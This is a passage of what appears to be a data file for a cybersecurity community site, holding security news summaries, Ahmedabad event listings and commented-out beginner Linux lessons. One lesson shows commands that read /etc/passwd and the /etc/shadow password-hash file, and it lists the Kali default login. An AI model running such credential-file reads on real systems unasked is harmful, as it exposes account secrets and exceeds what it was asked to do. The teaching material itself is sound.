    "tags": ["CISA", "telecom", "policy", "transparency"],
    "references": [
      {
        "title": "Congress.gov",
        "url": "https://www.congress.gov/bill/117th-congress/senate-bill/2480"
      },
      {
        "title": "The Register",
        "url": "https://www.theregister.com"
      }
    ],
    "editorNotes": [
      {
        "author": "Neely",
        "comment": "Even declassified, this report is likely to be sensitive, and we're talking about weaknesses in critical infrastructure."
      },
      {
        "author": "Dukes",
        "comment": "Senate staff had the chance to read the full report back in 2023."
      }
    ]
  },
  {
    "id": "n5",
    "headline": "Hackers are Exploiting a Critical Flaw in WordPress Theme",
    "summary": "Critical arbitrary file upload vulnerability in Alone WordPress theme being actively exploited.",
    "fullContent": "A critical arbitrary file upload vulnerability in the Alone – Charity Multipurpose Non-profit WordPress Theme is being actively exploited. The vulnerability was submitted to Wordfence on May 30, 2025. The theme's developer released an update to address the vulnerability on June 16, and Wordfence disclosed the issue publicly on July 14. Wordfence writes, 'Our records indicate that attackers started exploiting the issue on July 12th, 2025, before we disclosed the vulnerability. The Wordfence Firewall has already blocked over 120,900 exploit attempts targeting this vulnerability.' The flaw affects all versions of Alone up to and including 7.8.3; users are urged to update to version 7.8.5 or later.",
    "impact": "This vulnerability allows attackers to compromise WordPress sites using the vulnerable theme.",
    "category": "Web Security",
    "subcategory": "WordPress",
    "date": "2025-07-30",
    "severity": "Critical",
    "source": "SANS NewsBites",
    "tags": ["WordPress", "web security", "vulnerability"],
    "cves": [
      {
        "id": "CVE-2025-5394",
        "description": "Arbitrary file upload vulnerability in Alone WordPress theme"
      }
    ],
    "affectedVersions": "All versions up to and including 7.8.3",
    "fixedVersion": "7.8.5",
    "references": [
      {
        "title": "Wordfence Blog",
        "url": "https://www.wordfence.com/blog"
      },
      {
        "title": "The Hacker News",
        "url": "https://thehackernews.com"
      }
    ],
    "editorNotes": [
      {
        "author": "Neely",
        "comment": "The flaw allowed plugins to be installed from any source due to missing capability and nonce checks."
      },
      {
        "author": "Dukes",
        "comment": "Timing is everything. The vendor was relatively quick in providing a fix for the vulnerability."
      }
    ]
  },
    {
      "id": "news-2025-001",
      "headline": "NVIDIA Patches Multiple Vulnerabilities in Triton Inference Server",
      "summary": "NVIDIA has patched 17 vulnerabilities in their Triton Inference Server, including three critical flaws that could lead to code execution, denial of service, or data tampering.",
      "content": "NVIDIA has patched 17 vulnerabilities in their Triton Inference Server. NVIDIA rates three of the vulnerabilities as critical: two stack-based buffer overflows (CVE-2025-23310, CVE-2025-23311) and a heap-based buffer overflow (CVE-2025-23317) that could lead to code execution, denial of service, information disclosure, or data tampering. Researchers from Wiz have published a blog detailing a set of three vulnerabilities (CVE-2025-23319, CVE-2025-23320, and CVE-2025-23334) which when chained together could be exploited to take complete control of vulnerable servers.",
      "category": "Vulnerabilities",
      "subcategory": "AI Infrastructure",
      "date": "2025-08-04",
      "severity": "Critical",
      "tags": ["AI", "NVIDIA", "RCE", "cloud-security"],
      "cves": [
        "CVE-2025-23310",
        "CVE-2025-23311",
        "CVE-2025-23317",
        "CVE-2025-23319",
        "CVE-2025-23320",
        "CVE-2025-23334"
      ],
      "references": [
        {
          "title": "Wiz Blog",
          "url": "https://www.wiz.io/blog/breaking-nvidia-triton"
        },
        {
          "title": "NVIDIA Security Bulletin",
          "url": "https://nvidia.custhelp.com"
        }
      ],
      "editorNotes": [
        {
          "author": "Ullrich",
          "comment": "This shows how simple information leakage can be leveraged to obtain full remote code execution."
        },
        {
          "author": "Neely",
          "comment": "Apply the update before this starts getting actively exploited."
        }
      ]
    },
    {
      "id": "news-2025-002",
      "headline": "SonicWall Investigating Reports of Cyberattacks Targeting Firewalls",
      "summary": "SonicWall is investigating cyber incidents involving Gen 7 firewalls with SSLVPN enabled, possibly indicating a new zero-day vulnerability.",
      "content": "SonicWall is investigating recent 'internally and externally reported cyber incidents involving Gen 7 SonicWall firewalls where SSLVPN is enabled.' The company is attempting to determine whether the incidents are related to a known vulnerability or a new one. Until that is determined, SonicWall is urging customers to disable SSLVPN services where practical, limit SSLVPN connectivity to trusted source IPs, enable security services, enforce multi-factor authentication (MFA), remove unused accounts, and practice good password hygiene.",
      "category": "Cyber Attacks",
      "subcategory": "Network Security",
      "date": "2025-08-04",
      "severity": "High",
      "tags": ["SonicWall", "VPN", "zero-day", "ransomware"],
      "references": [
        {
          "title": "SonicWall Advisory",
          "url": "https://www.sonicwall.com"
        },
        {
          "title": "Arctic Wolf Report",
          "url": "https://arcticwolf.com"
        }
      ],
      "editorNotes": [
        {
          "author": "Neely",
          "comment": "SonicWall seems to be a recurring target. Check your fleet to ensure they are not EOL."
        },
        {
          "author": "Ullrich",
          "comment": "These attacks may be using stealthy backdoors left behind in prior attacks."
        }
      ]
    },
    {
      "id": "news-2025-003",
      "headline": "EU Biometric Identity Border Check Rollout Starting This Fall",
      "summary": "The EU will begin rolling out biometric border checks for non-EU travelers starting October 2025, capturing fingerprints and facial images.",
      "content": "Starting on October 2, 2025, the European Union will begin rolling out their Entry/Exit System (EES), which will digitally record the entries and exits of non-EU nationals travelling to 29 European countries for short stays. It will capture biometric data, such as fingerprints, facial image, and other travel information, gradually replacing the current system of passport stamping. In most cases, recorded biometric data will be stored for three years and one day.",
      "category": "Policy",
      "subcategory": "Border Security",
      "date": "2025-08-01",
      "severity": "Medium",
      "tags": ["EU", "biometrics", "privacy", "travel"],
      "references": [
        {
          "title": "EU Commission Announcement",
          "url": "https://ec.europa.eu"
        },
        {
          "title": "BBC Coverage",
          "url": "https://www.bbc.com"
        }
      ],
      "editorNotes": [
        {
          "author": "Neely",
          "comment": "The rollout starts in October and will take six months."
        },
        {
          "author": "Dukes",
          "comment": "What could possibly go wrong with biometrics in government databases?"
        }
      ]
    },
      {
      "id": "news-2025-005",
      "headline": "Future of UK Legal Aid Threatened by Disruption from Breach",
      "summary": "UK Legal Aid Agency systems remain offline three months after breach exposing sensitive applicant data dating back to 2007.",
      "fullContent": "The UK Legal Aid Agency (LAA) took its system offline in May 2025 following a significant cybersecurity breach. Threat actors accessed and exfiltrated personal information of legal aid applicants, with compromised records dating back to 2007. The stolen data includes:\n\n- Personal identifiers (names, addresses, dates of birth)\n- National ID numbers\n- Criminal history records\n- Employment and financial status\n- Case details and legal proceedings\n\nThe LAA's digital services have been offline for three months, severely impacting:\n1. Legal aid providers' ability to access client records\n2. Billing and payment systems\n3. New application processing\n\nAn interim manual system has increased administrative burdens by approximately 2 hours per case.",
      "category": "Data Breach",
      "subcategory": "Government Systems",
      "date": "2025-08-03T14:30:00Z",
      "lastUpdated": "2025-08-05T09:15:00Z",
      "severity": {
        "level": "High",
        "cvss": 7.5,
        "impactAreas": ["Confidentiality", "Availability"]
      },
      "affectedParties": {
        "individuals": 348000,
        "organizations": ["UK Legal Aid Agency", "Legal Aid Practitioners Group"],
        "sectors": ["Legal", "Government"]
      },
      "timeline": {
        "breachDiscovered": "2025-05-15",
        "systemsTakenOffline": "2025-05-16",
        "publicDisclosure": "2025-08-03"
      },
      "tags": ["UK", "legal", "PII", "downtime", "government", "data-theft"],
      "references": [
        {
          "source": "The Guardian",
          "url": "https://www.theguardian.com/legal-aid-breach-2025",
          "type": "news"
        },
        {
          "source": "UK Gov Official Statement",
          "url": "https://www.gov.uk/laa-breach-2025",
          "type": "official"
        },
        {
          "source": "Legal Gazette",
          "url": "https://lawgazette.co.uk/laa-breach-details",
          "type": "trade-publication"
        }
      ],
      "editorNotes": [
        {
          "author": "Neely",
          "role": "Senior Security Analyst",
          "comment": "Six months is a long time to wait on finding out your information has been compromised. Organizations need more efficient breach assessment protocols.",
          "timestamp": "2025-08-03T16:45:00Z"
        },
        {
          "author": "Dukes",
          "role": "Legal Cybersecurity Expert",
          "comment": "The delay in notification likely violates GDPR requirements for timely disclosure of breaches affecting personal data.",
          "timestamp": "2025-08-04T10:30:00Z"
        }
      ],
      "relatedIncidents": ["breach-2025-004", "breach-2025-012"],
      "mitigations": [
        "Implementation of new identity access management solution",
        "Phased restoration of services with priority systems first",
        "Enhanced monitoring of restored systems"
      ],
      "legalStatus": {
        "investigationOngoing": true,
        "classActionFiled": true,
        "regulatoryActions": ["ICO investigation"]
      }
    }
],

  events: [
 
   {
  "id": "bsides-ahmedabad-2025",
  "title": "BSides Ahmedabad 2025",
  "description": "BSides Ahmedabad was founded in 2019 & held its 5th edition in 2024. BSides Ahmedabad fostered a truly collaborative & informative environment, bringing together cybersecurity professionals from various backgrounds. Our motto is to be 'The Next-Gen Security Advancement'.",
  "startDate": "2025-09-10",
  "endDate": "2025-09-13",
  "time": "Multiple sessions across days",
  "location": {
    "venue": "AUDA AUDITORIUM Shela Karnavati Club Rd, Shela, Gujarat 380058",
    "city": "Ahmedabad",
    "state": "Gujarat",
    "country": "India",
    "address": "Ahmedabad, Gujarat, India",
    "coordinates": {
      "latitude": 23.0225,
      "longitude": 72.5714
    }
  },
  "price": {
    "type": "Paid (various tiers)",
    "trainingPrice": "To be announced",
    "conferencePrice": "To be announced"
  },
  "type": "Security Conference",
  "format": "In-Person",
  "organizer": "BSides Ahmedabad",
  "organizerWebsite": "https://bsidesahmedabad.in",
  "hosts": ["BSides Ahmedabad Team"],
  "expectedAttendees": 1000,
  "featured": true,
  "sessions": [
    {
      "title": "Training Day 1 - Various Workshops",
      "speaker": "Multiple trainers",
      "date": "2025-09-10",
      "time": "09:00-17:00",
      "type": "Workshop"
    },
    {
      "title": "Training Day 2 - Various Workshops",
      "speaker": "Multiple trainers",
      "date": "2025-09-11",
      "time": "09:00-17:00",
      "type": "Workshop"
    },
    {
      "title": "Conference Day 1 - Keynotes & Talks",
      "speaker": "Multiple speakers",
      "date": "2025-09-12",
      "time": "09:00-18:00",
      "type": "Conference"
    },
    {
      "title": "Conference Day 2 - Talks & Closing",
      "speaker": "Multiple speakers",
      "date": "2025-09-13",
      "time": "09:00-18:00",
      "type": "Conference"
    }
  ],
  "tags": ["Cybersecurity", "Infosec", "Hacking", "Network Security", "Training", "Conference"],
  "registration": "Required",
  "registrationLink": "https://bsidesahmedabad.in/passes/",
  "website": "https://bsidesahmedabad.in",
  "socialMedia": {
    "twitter": "https://twitter.com/bsidesahm",
    "linkedin": "https://linkedin.com/company/bsidesahmedabad"
  },
  "highlights": [
    "228 Speakers over the years",
    "50+ Sponsors & Partners",
    "4K+ Attendees over the years",
    "9M+ Digital Impressions"
  ],
  "cta": {
    "text": "Book Now",
    "link": "To be announced"
  },
  "image": "https://bsidesahmedabad.in/images/2025-banner.jpg"
},
{
  "id": "hackers-meetup-ahmedabad-2025",
  "title": "The Hackers Meetup Ahmedabad - National Security Special Edition",
  "description": "This isn't your typical event. It's an invitation to join the cybersecurity elite, share ideas, and supercharge your network! Initiative by Comexpo Cyber Security Foundation. Let's talk about #Hacking #HackTalk. By the Hackers For the Hackers.",
  "startDate": "2025-08-31",
  "time": "09:30-15:00",
  "location": {
    "venue": "GlobalVox 8th floor, Kataria Arcade, 801, off Sarkhej - Gandhinagar Highway, Makarba, Ahmedabad, Gujarat 380051, India  ",
    "city": "Ahmedabad",
    "state": "Gujarat",
    "country": "India",
    "address": "Ahmedabad, Gujarat, India"
  },
  "price": {
    "type": "Free",
    "note": "Limited seats available"
  },
  "type": "Meetup",
  "format": "In-Person",
  "organizer": "Comexpo Cyber Security Foundation",
  "hosts": ["Comexpo Team"],
  "attending": 0,
  "capacity": 150,
  // "sessions": [
  //   {
  //     "title": "Networking with cybersecurity professionals",
  //     "speaker": "Multiple attendees",
  //     "type": "Networking"
  //   },
  //   {
  //     "title": "Hacking discussions and talks",
  //     "speaker": "Community members",
  //     "type": "Panel Discussion"
  //   }
  // ],
  "tags": ["Hacking", "National Security", "Networking", "Cyber Security", "HackTalk"],
  "registration": "Required",
  "registrationNote": "Registration is compulsory for every individual (No Group Registration)",
  "registrationLink": "https://lu.ma/8x71fm5a",
  "highlights": [
    "Network with the brightest minds in cybersecurity",
    "Connect with industry professionals and visionaries",
    "Explore opportunities for growth and innovation",
    "Limited to 150 attendees only"
  ],
  "cta": {
    "text": "Hurry! Limited seats available. Secure your spot now!",
    "warning": "Aaoge Nahi to Pachtaoge (You'll regret if you don't come)"
  }
}
  ],

  // Jobs data
  jobs: [
    // {
    //   id: "1",
    //   title: "Senior Penetration Tester",
    //   company: "CyberSec Solutions",
    //   location: "San Francisco, CA",
    //   type: "Full-time",
    //   salary: "$120,000 - $150,000",
    //   description:
    //     "Lead penetration testing engagements for enterprise clients, conduct security assessments, and mentor junior team members.",
    //   skills: ["Penetration Testing", "OWASP", "Burp Suite", "Metasploit", "Python"],
    //   requirements: [
    //     "5+ years of penetration testing experience",
    //     "OSCP or similar certification preferred",
    //     "Strong knowledge of web application security",
    //     "Experience with network security testing",
    //     "Excellent written and verbal communication skills",
    //   ],
    //   benefits: [
    //     "Competitive salary and bonuses",
    //     "Health, dental, and vision insurance",
    //     "401(k) with company matching",
    //     "Professional development budget",
    //     "Flexible work arrangements",
    //   ],
    //   applyLink: "https://example.com/jobs/senior-pentest",
    //   postedDate: "2024-01-18",
    //   remote: false,
    //   experience: "Senior Level",
    //   education: "Bachelor's",
    // },
  ],

// Enhanced Learning Paths with detailed content
  learningPaths: {
//     beginner: {
//       id: "beginner",
//       title: "Beginner Path",
//       description: "Start your cybersecurity journey with fundamental concepts and hands-on practice.",
//       difficulty: "Beginner",
//       duration: "12 weeks",
//       estimatedHours: "120 hours",
//       prerequisites: ["Basic computer knowledge", "Willingness to learn"],
//       image: "/placeholder.svg?height=400&width=600&text=Beginner+Path",
//       color: "from-green-500 to-emerald-600",
//       topics: [
//         {
//           id: "linux-fundamentals",
//           title: "Linux Fundamentals",
//           description: "Master the Linux command line and system administration basics.",
//           duration: "2 weeks",
//           estimatedHours: "20 hours",
//           difficulty: "Beginner",
//           completed: false,
//           locked: false,
//           icon: "Terminal",
//           color: "bg-blue-500",
//           lessons: [
//             {
//               id: "intro-to-linux",
//               title: "Introduction to Linux",
//               duration: "45 min",
//               type: "video",
//               completed: false,
//               content: `# Introduction to Linux

// Linux is the backbone of cybersecurity. Understanding Linux is crucial for any security professional.

// ## What is Linux?

// Linux is an open-source operating system kernel that forms the foundation of many operating systems (distributions). It's widely used in servers, embedded systems, and security tools.

// ## Why Linux for Cybersecurity?

// ### 1. **Open Source Nature**
// - Complete transparency of the system
// - Ability to modify and customize
// - Strong community support
// - No licensing costs

// ### 2. **Security Features**
// - Built-in security mechanisms
// - Fine-grained permission system
// - Robust logging capabilities
// - Minimal attack surface when properly configured

// ### 3. **Command Line Power**
// - Powerful command-line interface
// - Scriptable and automatable
// - Remote administration capabilities
// - Efficient for repetitive tasks

// ## Popular Linux Distributions for Security

// ### **Kali Linux**
// - Pre-installed penetration testing tools
// - Debian-based distribution
// - Regular updates and tool additions
// - Optimized for security testing

// ### **Parrot Security OS**
// - Privacy-focused security distribution
// - Lightweight and fast
// - Includes anonymity tools
// - Good for both beginners and experts

// ### **Ubuntu/Debian**
// - Stable and well-supported
// - Large community
// - Good for learning fundamentals
// - Easy package management

// ## Getting Started

// ### Virtual Machine Setup
// 1. Download VirtualBox or VMware
// 2. Download Kali Linux ISO
// 3. Create a new virtual machine
// 4. Install Kali Linux
// 5. Configure network settings

// ### First Boot
// - Default credentials: kali/kali
// - Update the system: \`sudo apt update && sudo apt upgrade\`
// - Install additional tools as needed

// ## Basic Concepts

// ### **File System Hierarchy**
// - \`/\` - Root directory
// - \`/home\` - User home directories
// - \`/etc\` - Configuration files
// - \`/var\` - Variable data (logs, databases)
// - \`/usr\` - User programs and data
// - \`/tmp\` - Temporary files

// ### **Users and Groups**
// - Root user (UID 0) - System administrator
// - Regular users (UID 1000+)
// - System users (UID 1-999)
// - Groups for permission management

// ### **Permissions**
// - Read (r) - 4
// - Write (w) - 2
// - Execute (x) - 1
// - Owner, Group, Others

// ## Next Steps

// In the following lessons, we'll dive deeper into:
// - Command line navigation
// - File operations
// - Text processing
// - System monitoring
// - Package management
// - Network configuration

// **Remember**: Practice is key! Set up your own Linux environment and follow along with the exercises.`,
//             },
//             {
//               id: "command-line-basics",
//               title: "Command Line Basics",
//               duration: "60 min",
//               type: "interactive",
//               completed: false,
//               content: `# Command Line Basics

// The command line is your most powerful tool in Linux. Let's master the essential commands.

// ## Navigation Commands

// ### **pwd** - Print Working Directory
// Shows your current location in the file system.
// \`\`\`bash
// pwd
// # Output: /home/kali
// \`\`\`

// ### **ls** - List Directory Contents
// \`\`\`bash
// ls                    # Basic listing
// ls -l                 # Long format (detailed)
// ls -la                # Include hidden files
// ls -lh                # Human readable sizes
// ls -lt                # Sort by modification time
// ls -lr                # Reverse order
// \`\`\`

// ### **cd** - Change Directory
// \`\`\`bash
// cd /home/kali         # Absolute path
// cd Documents          # Relative path
// cd ..                 # Parent directory
// cd ~                  # Home directory
// cd -                  # Previous directory
// \`\`\`

// ## File Operations

// ### **touch** - Create Empty Files
// \`\`\`bash
// touch file.txt
// touch file1.txt file2.txt file3.txt
// \`\`\`

// ### **mkdir** - Create Directories
// \`\`\`bash
// mkdir directory_name
// mkdir -p path/to/nested/directory
// mkdir dir1 dir2 dir3
// \`\`\`

// ### **cp** - Copy Files and Directories
// \`\`\`bash
// cp source.txt destination.txt
// cp file.txt /path/to/destination/
// cp -r directory/ /path/to/destination/
// cp -v file.txt backup.txt    # Verbose output
// \`\`\`

// ### **mv** - Move/Rename Files
// \`\`\`bash
// mv oldname.txt newname.txt   # Rename
// mv file.txt /path/to/new/location/
// mv *.txt documents/          # Move all .txt files
// \`\`\`

// ### **rm** - Remove Files and Directories
// \`\`\`bash
// rm file.txt
// rm -r directory/             # Remove directory recursively
// rm -f file.txt               # Force removal
// rm -rf directory/            # Force recursive removal
// rm *.tmp                     # Remove all .tmp files
// \`\`\`

// ## Viewing File Contents

// ### **cat** - Display File Contents
// \`\`\`bash
// cat file.txt
// cat file1.txt file2.txt      # Multiple files
// cat -n file.txt              # Show line numbers
// \`\`\`

// ### **less/more** - Page Through Files
// \`\`\`bash
// less large_file.txt
// more large_file.txt
// \`\`\`

// ### **head/tail** - Show Beginning/End of Files
// \`\`\`bash
// head file.txt                # First 10 lines
// head -n 20 file.txt          # First 20 lines
// tail file.txt                # Last 10 lines
// tail -f logfile.txt          # Follow file changes
// \`\`\`

// ## Text Processing

// ### **grep** - Search Text Patterns
// \`\`\`bash
// grep "pattern" file.txt
// grep -i "pattern" file.txt   # Case insensitive
// grep -r "pattern" directory/ # Recursive search
// grep -n "pattern" file.txt   # Show line numbers
// grep -v "pattern" file.txt   # Invert match
// \`\`\`

// ### **find** - Search for Files and Directories
// \`\`\`bash
// find /path -name "filename"
// find . -name "*.txt"
// find /home -user kali
// find . -size +100M           # Files larger than 100MB
// find . -type f -executable   # Executable files
// \`\`\`

// ### **sort** - Sort Lines in Files
// \`\`\`bash
// sort file.txt
// sort -r file.txt             # Reverse order
// sort -n numbers.txt          # Numeric sort
// sort -u file.txt             # Remove duplicates
// \`\`\`

// ### **uniq** - Remove Duplicate Lines
// \`\`\`bash
// uniq file.txt
// sort file.txt | uniq         # Sort first, then remove duplicates
// uniq -c file.txt             # Count occurrences
// \`\`\`

// ## System Information

// ### **whoami** - Current User
// \`\`\`bash
// whoami
// \`\`\`

// ### **id** - User and Group IDs
// \`\`\`bash
// id
// id username
// \`\`\`

// ### **ps** - Running Processes
// \`\`\`bash
// ps                           # Current user processes
// ps aux                       # All processes
// ps aux | grep process_name   # Find specific process
// \`\`\`

// ### **top/htop** - System Monitor
// \`\`\`bash
// top                          # System monitor
// htop                         # Enhanced system monitor
// \`\`\`

// ### **df** - Disk Space Usage
// \`\`\`bash
// df -h                        # Human readable format
// \`\`\`

// ### **du** - Directory Usage
// \`\`\`bash
// du -h directory/             # Directory size
// du -sh *                     # Size of all items in current directory
// \`\`\`

// ## File Permissions

// ### **chmod** - Change Permissions
// \`\`\`bash
// chmod 755 file.txt           # rwxr-xr-x
// chmod +x script.sh           # Add execute permission
// chmod -w file.txt            # Remove write permission
// chmod u+x,g-w,o-r file.txt   # Complex permissions
// \`\`\`

// ### **chown** - Change Ownership
// \`\`\`bash
// sudo chown user:group file.txt
// sudo chown -R user:group directory/
// \`\`\`

// ## Input/Output Redirection

// ### **Redirection Operators**
// \`\`\`bash
// command > file.txt           # Redirect output to file (overwrite)
// command >> file.txt          # Redirect output to file (append)
// command < file.txt           # Use file as input
// command 2> error.log         # Redirect errors to file
// command &> all_output.txt    # Redirect both output and errors
// \`\`\`

// ### **Pipes**
// \`\`\`bash
// command1 | command2          # Pipe output of command1 to command2
// ls -l | grep ".txt"          # List files and filter for .txt files
// cat file.txt | sort | uniq   # Chain multiple commands
// \`\`\`

// ## Practical Exercises

// ### Exercise 1: File Management
// 1. Create a directory called "security_tools"
// 2. Navigate into it
// 3. Create three files: nmap.txt, burp.txt, metasploit.txt
// 4. List the files with detailed information
// 5. Copy nmap.txt to nmap_backup.txt
// 6. Remove the original nmap.txt

// ### Exercise 2: Text Processing
// 1. Create a file with some duplicate lines
// 2. Sort the file and remove duplicates
// 3. Count the number of lines in the result
// 4. Search for a specific pattern in the file

// ### Exercise 3: System Exploration
// 1. Find your current working directory
// 2. List all processes running on the system
// 3. Check disk space usage
// 4. Find all .txt files in your home directory

// ## Tips for Efficiency

// ### **Tab Completion**
// - Press Tab to auto-complete commands and file names
// - Press Tab twice to see all available options

// ### **Command History**
// - Use Up/Down arrows to navigate command history
// - \`history\` command to see all previous commands
// - \`!n\` to execute command number n from history
// - \`!!\` to execute the last command

// ### **Aliases**
// \`\`\`bash
// alias ll='ls -la'
// alias grep='grep --color=auto'
// alias ..='cd ..'
// \`\`\`

// ### **Keyboard Shortcuts**
// - \`Ctrl+C\` - Interrupt current command
// - \`Ctrl+Z\` - Suspend current command
// - \`Ctrl+L\` - Clear screen
// - \`Ctrl+A\` - Move to beginning of line
// - \`Ctrl+E\` - Move to end of line

// ## Next Steps

// Now that you understand the basics, practice these commands daily. In the next lesson, we'll explore:
// - Advanced text processing with sed and awk
// - Shell scripting basics
// - System administration tasks
// - Network commands

// **Remember**: The command line becomes second nature with practice. Don't be afraid to experiment!`,
//             },
//             {
//               id: "file-system-navigation",
//               title: "File System Navigation",
//               duration: "40 min",
//               type: "hands-on",
//               completed: false,
//               content: `# File System Navigation

// Understanding the Linux file system structure is crucial for effective system administration and security work.

// ## Linux File System Hierarchy

// ### **Root Directory (/)**
// The top-level directory of the Linux file system. Everything starts here.

// ### **Essential Directories**

// #### **/bin** - Essential User Binaries
// Contains essential command-line utilities that are available to all users.
// \`\`\`bash
// ls /bin
// # Common commands: ls, cp, mv, rm, cat, grep, etc.
// \`\`\`

// #### **/sbin** - System Binaries
// Contains essential system administration binaries.
// \`\`\`bash
// ls /sbin
// # System commands: iptables, ifconfig, mount, etc.
// \`\`\`

// #### **/etc** - Configuration Files
// Contains system-wide configuration files.
// \`\`\`bash
// ls /etc
// # Important files: passwd, shadow, hosts, fstab, etc.
// \`\`\`

// #### **/home** - User Home Directories
// Contains personal directories for regular users.
// \`\`\`bash
// ls /home
// # User directories: /home/kali, /home/user1, etc.
// \`\`\`

// #### **/root** - Root User Home
// Home directory for the root user (system administrator).

// #### **/var** - Variable Data
// Contains files that change frequently during system operation.
// \`\`\`bash
// ls /var
// # Subdirectories: log, mail, spool, tmp, www, etc.
// \`\`\`

// #### **/tmp** - Temporary Files
// Temporary files that are deleted on system reboot.

// #### **/usr** - User Programs
// Contains user applications and utilities.
// \`\`\`bash
// ls /usr
// # Subdirectories: bin, sbin, lib, share, local, etc.
// \`\`\`

// #### **/opt** - Optional Software
// Contains optional software packages.

// #### **/dev** - Device Files
// Contains device files that represent hardware components.
// \`\`\`bash
// ls /dev
// # Device files: sda, sdb, tty, null, zero, etc.
// \`\`\`

// #### **/proc** - Process Information
// Virtual file system containing information about running processes.
// \`\`\`bash
// ls /proc
// # Process directories: 1, 2, 3, etc. (PID numbers)
// \`\`\`

// #### **/sys** - System Information
// Virtual file system containing information about the system and kernel.

// ## Navigation Techniques

// ### **Absolute vs Relative Paths**

// #### Absolute Paths
// Start from the root directory (/).
// \`\`\`bash
// cd /home/kali/Documents
// cd /etc/apache2
// cd /var/log
// \`\`\`

// #### Relative Paths
// Start from the current directory.
// \`\`\`bash
// cd Documents          # If currently in /home/kali
// cd ../kali           # Go up one level, then to kali
// cd ./scripts         # Current directory, then scripts
// \`\`\`

// ### **Special Directory Symbols**

// #### **. (dot)** - Current Directory
// \`\`\`bash
// ls .                 # List current directory
// cp file.txt .        # Copy to current directory
// \`\`\`

// #### **.. (double dot)** - Parent Directory
// \`\`\`bash
// cd ..                # Go to parent directory
// ls ../               # List parent directory
// cp ../file.txt .     # Copy from parent to current
// \`\`\`

// #### **~ (tilde)** - Home Directory
// \`\`\`bash
// cd ~                 # Go to home directory
// ls ~/Documents       # List Documents in home
// cp file.txt ~/       # Copy to home directory
// \`\`\`

// #### **- (dash)** - Previous Directory
// \`\`\`bash
// cd -                 # Go to previous directory
// \`\`\`

// ## Advanced Navigation Commands

// ### **pushd and popd** - Directory Stack
// \`\`\`bash
// pushd /var/log       # Push current dir to stack, go to /var/log
// pushd /etc           # Push /var/log to stack, go to /etc
// dirs                 # Show directory stack
// popd                 # Pop from stack, return to previous directory
// \`\`\`

// ### **locate** - Find Files Quickly
// \`\`\`bash
// locate filename      # Find files by name (uses database)
// sudo updatedb        # Update locate database
// \`\`\`

// ### **which** - Find Command Location
// \`\`\`bash
// which ls             # Shows: /bin/ls
// which python3        # Shows: /usr/bin/python3
// \`\`\`

// ### **whereis** - Find Binary, Source, Manual
// \`\`\`bash
// whereis ls           # Shows binary, source, and manual locations
// \`\`\`

// ## File System Exploration

// ### **Tree Command** - Visual Directory Structure
// \`\`\`bash
// tree                 # Show directory tree
// tree -L 2            # Limit to 2 levels
// tree -a              # Show hidden files
// tree /etc            # Tree of specific directory
// \`\`\`

// ### **File Command** - Determine File Type
// \`\`\`bash
// file filename        # Determine file type
// file *               # Check all files in directory
// \`\`\`

// ### **stat Command** - Detailed File Information
// \`\`\`bash
// stat filename        # Detailed file statistics
// stat -c %s filename  # File size only
// stat -c %a filename  # Permissions in octal
// \`\`\`

// ## Working with Hidden Files

// ### **Hidden Files and Directories**
// Files starting with a dot (.) are hidden by default.

// \`\`\`bash
// ls -a                # Show all files including hidden
// ls -la               # Long format with hidden files
// ls .*                # List only hidden files
// \`\`\`

// ### **Common Hidden Files**
// - \`.bashrc\` - Bash configuration
// - \`.bash_history\` - Command history
// - \`.ssh/\` - SSH configuration and keys
// - \`.profile\` - User profile settings

// ## Practical Navigation Exercises

// ### **Exercise 1: System Exploration**
// 1. Navigate to the root directory
// 2. List all directories in root
// 3. Explore the /etc directory
// 4. Find the passwd file
// 5. Check the file type of /etc/passwd

// \`\`\`bash
// cd /
// ls
// cd /etc
// ls | grep passwd
// file /etc/passwd
// \`\`\`

// ### **Exercise 2: Log File Investigation**
// 1. Navigate to /var/log
// 2. List all log files
// 3. Check the size of auth.log
// 4. View the last 10 lines of syslog

// \`\`\`bash
// cd /var/log
// ls -la
// stat -c %s auth.log
// tail syslog
// \`\`\`

// ### **Exercise 3: Home Directory Management**
// 1. Go to your home directory
// 2. Create a directory structure: projects/security/tools
// 3. Navigate to the tools directory
// 4. Create a file called nmap_notes.txt
// 5. Navigate back to home using different methods

// \`\`\`bash
// cd ~
// mkdir -p projects/security/tools
// cd projects/security/tools
// touch nmap_notes.txt
// cd ~
// cd -
// cd ../../../
// \`\`\`

// ## Security-Relevant Directories

// ### **Important Security Locations**

// #### **/etc/passwd** - User Account Information
// \`\`\`bash
// cat /etc/passwd
// # Format: username:x:UID:GID:comment:home:shell
// \`\`\`

// #### **/etc/shadow** - Password Hashes
// \`\`\`bash
// sudo cat /etc/shadow
// # Contains encrypted passwords
// \`\`\`

// #### **/var/log** - System Logs
// \`\`\`bash
// ls /var/log
// # Important logs: auth.log, syslog, kern.log, etc.
// \`\`\`

// #### **/proc** - Process and System Information
// \`\`\`bash
// cat /proc/version     # Kernel version
// cat /proc/cpuinfo     # CPU information
// cat /proc/meminfo     # Memory information
// \`\`\`

// #### **/dev** - Device Files
// \`\`\`bash
// ls /dev/sd*          # Storage devices
// ls /dev/tty*         # Terminal devices
// \`\`\`

// ## Tips for Efficient Navigation

// ### **Tab Completion**
// - Use Tab to complete directory and file names
// - Double-Tab to see all available options

// ### **Command History**
// - Use Up/Down arrows for command history
// - \`Ctrl+R\` for reverse search in history

// ### **Bookmarking Directories**
// \`\`\`bash
// # Add to .bashrc
// export TOOLS="/home/kali/tools"
// export LOGS="/var/log"

// # Usage
// cd $TOOLS
// cd $LOGS
// \`\`\`

// ### **Creating Aliases**
// \`\`\`bash
// # Add to .bashrc
// alias ll='ls -la'
// alias la='ls -la'
// alias logs='cd /var/log'
// alias tools='cd ~/tools'
// \`\`\`

// ## Common Navigation Mistakes

// ### **Avoid These Pitfalls**
// 1. **Using spaces in directory names** - Use underscores or hyphens instead
// 2. **Not using tab completion** - Saves time and prevents typos
// 3. **Forgetting about hidden files** - Always check with \`ls -la\`
// 4. **Not understanding relative vs absolute paths** - Practice both methods

// ## Next Steps

// Now that you can navigate the file system effectively, you're ready to:
// - Learn about file permissions and ownership
// - Explore system configuration files
// - Understand log file analysis
// - Practice with security-related directories

// **Remember**: Navigation is the foundation of all Linux work. Practice these commands until they become second nature!`,
//             },
//           ],
//         },
//         {
//           id: "networking-basics",
//           title: "Networking Fundamentals",
//           description: "Understand network protocols, TCP/IP, and network security concepts.",
//           duration: "3 weeks",
//           estimatedHours: "30 hours",
//           difficulty: "Beginner",
//           completed: false,
//           locked: false,
//           icon: "Network",
//           color: "bg-purple-500",
//           lessons: [
//             {
//               id: "intro-to-networking",
//               title: "Introduction to Networking",
//               duration: "50 min",
